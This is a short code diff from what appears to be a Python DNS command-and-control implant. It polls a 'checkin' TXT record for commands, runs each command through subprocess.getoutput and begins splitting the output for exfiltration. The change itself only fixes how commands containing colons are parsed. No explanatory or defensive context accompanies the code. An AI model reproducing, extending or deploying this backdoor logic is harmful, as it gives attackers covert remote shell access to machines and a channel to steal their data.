@@ -6,8 +6,8 @@ while True:
     time.sleep(1)
     i = str(dns.resolver.query("checkin"+b,"TXT").response.answer[0][0]).split('"')[1]
     if i != "wait":
-        (r, c) = i.split(":")
-        o = subprocess.getoutput(c)
+        r = i.split(":")[0]
+        o = subprocess.getoutput(":".join(i.split(":")[1:]))
         j=1
         while len(o) !=0:
             h = r+str(j+1)+":"
